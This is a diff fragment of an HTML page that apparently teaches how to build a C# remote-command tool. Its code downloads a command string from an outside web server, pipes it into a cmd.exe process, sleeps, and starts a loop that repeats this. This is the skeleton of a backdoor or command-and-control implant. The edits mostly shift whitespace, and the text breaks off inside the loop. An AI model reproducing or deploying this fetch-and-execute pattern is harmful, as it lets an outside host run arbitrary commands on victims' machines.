@@ -3,9 +3,11 @@
 <b>Let's understand it.</b><br>
 <b>This will get the command from online web server.
 </b><br>
+  
                           new WebClient().DownloadString("https://r.significantbyte.com/go.php");<br>
 <br><br><br>
-<b>Run command in device.</b><br>
+<b>Run command in device.</b>
+  
                             Process cmd = new Process();<br>
                             cmd.StartInfo.FileName = "cmd.exe";<br>
                             cmd.StartInfo.RedirectStandardInput = true;<br>
@@ -18,9 +20,12 @@
                             <br><br><br>
   
 <b>Lets wait for 1 second</b><br>
-                            Thread.Sleep(1000);<br><br><br>
+                          Thread.Sleep(1000);<br>
+                            
 <b>Now lets combine the whole idea. Get the command and run cmd in while loop</b>
- while (chk == 0)
+
+  
+      while (chk == 0)
             {
                 try
                 {
